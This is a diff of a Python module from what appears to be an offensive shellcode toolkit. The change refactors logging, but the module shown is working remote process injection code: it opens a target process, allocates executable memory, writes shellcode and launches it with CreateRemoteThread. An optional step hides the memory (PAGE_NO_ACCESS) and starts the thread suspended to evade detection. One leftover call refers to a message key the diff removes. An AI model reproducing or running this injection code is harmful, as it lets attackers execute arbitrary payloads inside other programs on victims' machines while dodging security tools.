@@ -1,13 +1,12 @@
 ########################################################
 ### Injection Module
-### Status: migrated 085
+### Status: 086
 ### 
 ########################################################
 
 import os
 from utils.windef import *
 from utils.winconst import *
-#from utils.helper import nstate
 from utils.style import *
 from utils.helper import CheckFile, GetFileInfo
 
@@ -39,7 +38,7 @@ class module:
     import threading
 
     Author = 'cpu0x00, psycore8'
-    Version = '2.1.8'
+    Version = '2.2.0'
     DisplayName = 'INJECTION'
     delay = 5
     data_size = 0
@@ -49,7 +48,6 @@ class module:
     shell_path = '::inject::injection'
 
     def __init__(self, input, process, start_process, shellcode=None, resume_thread=None, virtual_protect=None):
-    #def __init__(self, **arglist):
         self.input = input
         self.process_start = start_process
         self.target_process = process
@@ -57,25 +55,15 @@ class module:
         self.resume_thread = resume_thread
         self.virtual_protect = virtual_protect
 
-    def msg(self, message_type, ErrorExit=False):
+    def msg(self, message_type, MsgVar=any, ErrorExit=False):
         messages = {
             'pre.head'       : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
             'error.input'    : f'{s_fail} File {self.input} not found or cannot be opened.',    
             'post.done'      : f'{s_ok} DONE!',
             'proc.input_ok'  : f'{s_ok} File {self.input} loaded\n{s_ok} Size of shellcode {self.data_size} bytes\n{s_ok} Hash: {self.hash}',
-            'proc.input_try' : f'{s_note} Try to open file {self.input}',
-            'proc.try'       : f'{s_note} Try to execute shellcode',
-            'inj.run'        : f'{s_note} starting {self.target_process}',
-            'inj.pid'        : f'{s_note} {self.target_process} process id: {self.pid}',
-            'inj.handle'     : f'{s_note} Opened a Handle to the process',
-            'inj.alloc'      : f'{s_note} Allocated Memory in the process',
-            'inj.write'      : f'{s_ok} Wrote The shellcode to memory',
-            'inj.nacc'       : f'{s_note} VirtualProtectEx: PAGE_NO_ACCESS',
-            'inj.susp'       : f'{s_note} CreateRemoteThread: START_SUSPENDED',
-            'inj.inj_ok'     : f'{s_ok} Injected the shellcode into the process',
-            'inj.rwe'        : f'{s_note} VirtualProtectEx: PAGE_READWRITE_EXECUTE',
-            'inj.rest'       : f'{s_note} ResumeThread',
-            'inj.resume'     : f'{s_ok} Process resumed'
+            'mok'            : f'{s_ok} {MsgVar}',
+            'mnote'          : f'{s_note} {MsgVar}',
+            'merror'         : f'{s_fail} {MsgVar}'
 
         }
         print(messages.get(message_type, f'{message_type} - this message type is unknown'))
@@ -83,13 +71,13 @@ class module:
             exit()
 
     def Start_Process(self):
-        self.msg('inj.run')
+        self.msg('mnote', f'starting {self.target_process}')
         os.system(self.target_process)
 
     def get_proc_id(self):
         processes = self.wmi.WMI().Win32_Process(name=self.target_process)
         self.pid = processes[0].ProcessId
-        self.msg('inj.pid')
+        self.msg('mnote', f'{self.target_process} process id: {self.pid}')
         return int(self.pid)
 
     def start_injection(self):
@@ -102,38 +90,39 @@ class module:
         
         phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
         if phandle:
-            self.msg('inj.handle')
+            self.msg('mnote', 'Process handle opened')
 
         memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
         if memory:
-            self.msg('inj.alloc')
+            self.msg('mnote', 'Process memory allocated')
 
         writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0)
         if writing:
-            self.msg('inj.write')
+            self.msg('mnote', 'Shellcode was written to memory')
         if self.virtual_protect:
-            self.msg('inj.nacc')
+            self.msg('mnote', 'VirtualProtectEx: PAGE_NO_ACCESS')
             VirtualProtectEx(phandle, None, 0, 0x01, None)
 
         if self.resume_thread or self.virtual_protect:
-            self.msg('inj.susp')
+            self.msg('mnote', 'CreateRemoteThread: START_SUSPENDED')
             Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
         else:
             Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)
 
         if Injection:
-            self.msg('inj.inj_ok')
+            self.msg('mok', 'Shellcode injected!')
 
         if self.virtual_protect:
-            self.msg('inj.rwe')
+            self.msg('mnote', 'VirtualProtectEx: PAGE_READWRITE_EXECUTE')
             VirtualProtectEx(phandle, None, 0, 0x40, None)
 
         if self.resume_thread or self.virtual_protect:
             self.sleep(self.delay)
+            self.msg('mnote', 'ResumeThread')
             self.msg('inj.rest')
             resume = ResumeThread(Injection)
             if resume:
-                self.msg('inj.resume')
+                self.msg('mok', 'Process resumed')
 
         CloseHandle(phandle)
 
@@ -150,16 +139,16 @@ class module:
     def process(self):
         self.msg('pre.head')
         if isinstance(self.input, str):
-            self.msg('proc.input_try')
+            self.msg('mnote', f'Try to open file {self.input}')
             CheckFile(self.input)
             self.data_size, self.hash = GetFileInfo(self.input)
             self.msg('proc.input_ok')
             self.open_file()
-            self.msg('proc.try')
+            self.msg('mnote', 'Try to execute shellcode')
             self.start_injection()
         elif isinstance(self.input, bytes):
             self.shellcode = self.input
             self.start_injection()
         else:
-            self.msg('error.input', True)
+            self.msg('error.input', ErrorExit=True)
         self.msg('post.done')
